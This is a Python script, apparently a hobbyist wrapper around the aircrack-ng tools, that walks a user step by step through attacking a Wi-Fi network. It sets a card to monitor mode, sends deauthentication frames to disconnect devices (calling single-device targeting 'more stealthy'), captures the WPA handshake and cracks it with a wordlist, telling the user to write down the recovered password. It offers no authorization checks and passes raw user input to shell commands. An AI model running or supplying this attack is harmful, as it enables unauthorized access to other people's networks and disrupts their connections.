#!/usr/bin/python3
import os,time
print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
os.system("sudo apt-get update > log.txt;sudo apt install apt -y > log.txt;sudo apt install xterm -y > log.txt")
os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install aircrack-ng -y")
time.sleep(0.5)
os.system("clear")
while True:
	try:
		def mainScreen():
			print ("""
\n\033[1;36;48m
          _______ _________ _                   _______  _______  ________          _ 
|\     /|(  ___  )\__   __/( \        |\     /|(  ____ \(  ____ \/__   __/|\     /|( )
| )   ( || (   ) |   ) (   | (        | )   ( || (    \/| (    \/   ) (   ( \   / )| |
| (___) || (___) |   | |   | |        | | _ | || (__    | (_____    | |    \ (_) / | |
|  ___  ||  ___  |   | |   | |        | |( )| ||  __)   (_____  )   | |     \   /  | |
| (   ) || (   ) |   | |   | |        | || || || (            ) |   | |      ) (   (_)
| )   ( || )   ( |___) (___| (____/\  | () () || (____/\/\____) |   | |      | |    _ 
|/     \||/     \|\_______/(_______/  (_______)(_______/\_______)   )_(      \_/   (_)
\n\033[0;37;48m                                                                                      
""")
			os.system("echo 'Starting...'")
			os.system("airmon-ng stop wlan1mon > log.txt && airmon-ng stop wlan0mon >> log.txt")
			print("\nHi, welcome to aircrack-ng made easy")
			print("Please read everything that appears at the bottom")
			print("Thanks for using this program")
			print("\n\033[1;32;48m[+] \033[0;37;48myour cards are: \n")
			os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
			print("\n")
			index = input("\033[1;33;48m[?] \033[0;37;48mWhat card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
			query = ("wlan"+"%s" %(index))
			query = str(query)
			os.system("airmon-ng start %s >> log.txt" %(query))
			print("\033[1;34;48m[info] \033[0;37;48m1) Ok, seems like %s is started, time to get crackin'" %(query))
			print("\033[1;34;48m[info] \033[0;37;48m2) now, we'll run Airodump-ng to capture the handshake")
			input("\033[1;33;48m[?] \033[0;37;48m3) once you start airodump, you need to press ctrl+c when you see your target network. \npress enter to continue >>")
			os.system("airodump-ng -a %smon" %(query)) 
			print("Ok, all I need is a few things from you")
			b = input("\033[1;33;48m[?] \033[0;37;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces]>>")
			b = str(b)
			c = input("\033[1;33;48m[?] \033[0;37;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>>")
			c = str(c)
			d = input("\033[1;33;48m[?] \033[0;37;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>>")
			d = str(d)
			if b and c and d != "":
				print("\033[1;34;48m[info] \033[0;37;48mNow, the idea is when someone connects/reconnects, we grab the password")
				print("\033[1;34;48m[info] \033[0;37;48mThat's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
				print("\033[1;34;48m[info] \033[0;37;48mYou can leave it blank to not disconnect anyone")
				e = input("\n\033[1;33;48m[?] \033[0;37;48mHow many de-auths/disconnects shall I send? >>")
				e = str(e)
				print("\033[1;34;48m[info] \033[0;37;48mLook at the second column where it says bssid/station.")
				print("\033[1;34;48m[info] \033[0;37;48mIn simple terms the bssid is the wifi access point and the station is a devices connected to that network.")
				print("\033[1;34;48m[info] \033[0;37;48mYou can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
				print("\033[1;34;48m[info] \033[0;37;48mThis is a more stealthy as only one device is being disconnected.")
				print("\033[1;34;48m[info] \033[0;37;48mplease ensure that the station (address) you copy/paste has the bssid you copied earlier [Look in the bssid column]")
				print("It is optional but you can also leave this blank if you still don't get it")
				g = input("\n\033[1;33;48m[?] \033[0;37;48mPlease copy/paste station (address) here or leave blank>>")
				g = str(g)
				if e != "" and g != "":
					input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
					os.system("iwconfig %smon channel %s" %(query,c))
					os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,g,query,b,c,d,query))
					print("\033[1;34;48m[info] \033[0;37;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
					print("\033[1;34;48m[info] \033[0;37;48mFirst make sure you have a wordlist which has the password in it ")
					print("\033[1;34;48m[info] \033[0;37;48mOnce you download or locate one press enter")
					print("\033[1;34;48m[info] \033[0;37;48mHopefully the password will be in there or put it in there")
					f = input("\n\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
					f = str(f)
					print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
					print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found after a while then ctrl+c and try again with a different wordlist")
					input("\033[1;33;48m[press enter]>>")
					os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
					input("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN AND PRESS ENTER TO CLEANUP >>")
					print("\n\033[1;34;48m[info] \033[0;37;48mRunning cleanup..")
					os.system("airmon-ng stop %smon > log.txt" %(query))
					os.system("rm log.txt")
					os.system("clear")
					print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
					print("\033[1;32;48m[+] \033[0;37;48mGOODBYE!")
					os._exit(1)
				elif e != "" and g == "":
					input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
					os.system("iwconfig %smon channel %s" %(query,c))
					os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,query,b,c,d,query))
					print("\n\033[1;34;48m[info] \033[0;37;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
					print("\033[1;34;48m[info] \033[0;37;48mFirst make sure you have a wordlist which has the password in it ")
					print("\033[1;34;48m[info] \033[0;37;48mOnce you download or locate one press enter")
					print("\033[1;34;48m[info] \033[0;37;48mHopefully the password will be in there or put it in there")
					f = input("\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
					f = str(f)
					print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
					print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
					input("\033[1;33;48m[press enter]>>")
					os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
					input("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN AND PRESS ENTER TO CLEANUP >>")
					print("\n\033[1;34;48m[info] \033[0;37;48mRunning cleanup..")
					os.system("airmon-ng stop %smon > log.txt" %(query))
					os.system("rm log.txt")
					os.system("clear")
					print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
					print("\033[1;32;48m[+] \033[0;37;48mGOODBYE!")					
				else:
					print("\033[1;34;48m[info] \033[0;37;48mOk, you have chosen not to disconnect anyone.")
					print("\033[1;34;48m[info] \033[0;37;48mYou need to wait for someone to connect or connect manually yourself")
					input("\033[1;34;48m[info] \033[0;37;48mReady? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
					os.system("\niwconfig %smon channel %s" %(query,c))
					os.system("\nairodump-ng -w %s -c %s --bssid %s %smon" %(b,c,d,query))
					print("\n\033[1;34;48m[info] \033[0;37;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
					print("\033[1;34;48m[info] \033[0;37;48mFirst make sure you have a wordlist which has the password in it ")
					print("\033[1;34;48m[info] \033[0;37;48mOnce you download or locate one press enter")
					print("\033[1;34;48m[info] \033[0;37;48mHopefully the password will be in there or put it in there")
					f = input("\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
					f = str(f)
					print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
					print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
					input("\033[1;33;48m[press enter]>>")
					os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
					input("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN AND PRESS ENTER TO CLEANUP >>")
					print("\n\033[1;34;48m[info] \033[0;37;48mRunning cleanup..")
					os.system("airmon-ng stop %smon > log.txt" %(query))
					os.system("rm log.txt")
					os.system("clear")
					print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
					print("\033[1;32;48m[+] \033[0;37;48mGOODBYE!")
					os._exit(1)
					
			else:
				input("\033[1;37;40m[-] \033[0;37;48mYou missed something, try again, \n\033[1;33;48m[press enter]>>")
				mainScreen()
		mainScreen()
	except(KeyboardInterrupt,EOFError,TypeError,TabError):
		print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
		os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
		os.system("clear")
		if input("\n\033[1;31;48m[info] \033[0;37;48mExit or return to start? press [y] to exit or any other key to return to start>>").lower().startswith("y"):
			os.system("rm log.txt")
			os._exit(1)
		else:
			os.system("clear")
			mainScreen()
			os.system("rm log.txt")

